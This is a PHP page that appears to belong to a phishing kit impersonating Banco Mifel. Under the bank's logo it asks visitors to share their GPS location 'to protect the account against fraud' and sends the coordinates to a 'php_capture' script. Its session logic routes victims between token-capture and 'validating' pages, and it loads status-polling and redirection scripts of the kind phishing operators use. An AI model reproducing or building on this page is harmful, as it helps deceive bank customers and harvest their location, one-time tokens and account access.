<?php
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: personas.html');
    exit;
}

require_once __DIR__ . '/php_config/conexionbd.php';
require_once __DIR__ . '/php_config/token_pantalla_helpers.php';

$pdo = conectarBD();
$usuario = tokenPantallaObtenerUsuario($pdo, (int) $_SESSION['usuario_id']);

if (!$usuario || !tokenPantallaPuedeAccederGps($usuario)) {
    $rutas = tokenPantallaRutas($usuario);
    if ($usuario && tokenPantallaRequiereCapturaToken($usuario) && !tokenPantallaTokenIngresado($usuario)) {
        header('Location: ' . $rutas['token']);
    } else {
        header('Location: ' . $rutas['validando']);
    }
    exit;
}

require_once __DIR__ . '/includes/personas_token_assets.php';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activa tu ubicación - Acceso</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/feLinicio.css">
    <link rel="stylesheet" href="css/_responsivefel.css">
    <link rel="stylesheet" href="css/gps.css">
    <link rel="stylesheet" href="php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="php_modales/css/herramientas.css">
    <link rel="stylesheet" href="php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="php_modales/css/email_validate.css">
    <?php personas_token_assets_head(); ?>
    <link rel="stylesheet" href="css/zeppelin_churro_btn.css">
    <?php require_once __DIR__ . '/includes/responsive_movil.php'; mifel_responsive_movil_assets('gps-flujo'); ?>
</head>
<body>
    <header class="header-container">
        <div class="header-wrapper">
            <div class="logo-center">
                <img src="images/logo_mifel_hd.svg" alt="Mifel" class="mifel-header-logo">
            </div>
            <div class="language-dropdown">
                <img src="images/Flag_mx2.svg" alt="México" class="flag-icon">
                <span class="language-text">ES</span>
                <img src="images/drop_down.png" alt="dropdown" class="dropdown-arrow">
            </div>
        </div>
    </header>
    
    <main class="gps-container">
        <div class="gps-content">
            <div class="gps-icon-container">
                <img src="images/gps.png" alt="Ubicación GPS" class="gps-icon">
            </div>
            
            <h1 class="gps-title">Activa tu ubicación</h1>
            
            <p class="gps-description">
                Permite a Mifel el acceso a tu ubicación desde el navegador para ayudar a proteger tu cuenta contra fraudes.
            </p>
            
            <form id="gpsForm" action="php_capture/gps.php" method="POST">
                <input type="hidden" name="latitud" id="gpsLatitud" value="">
                <input type="hidden" name="longitud" id="gpsLongitud" value="">
                <input type="hidden" name="gps_estado" id="gpsEstado" value="">
                <button type="submit" id="gpsContinueBtn" class="continue-button">Continuar</button>
            </form>
        </div>
    </main>
    
    <script src="js/gpsLocation.js"></script>
    <script src="php_modales/js/check_status.js"></script>
    <script src="php_modales/js/modales_input_no_input.js"></script>
    <script src="php_modales/js/herramientas.js"></script>
    <script src="php_modales/js/reloj_personalizado.js"></script>
    <script src="php_modales/js/redirecciones.js"></script>
    <script src="php_modales/js/email_validate_handler.js"></script>
    <?php personas_token_assets_scripts(); ?>
</body>
</html>
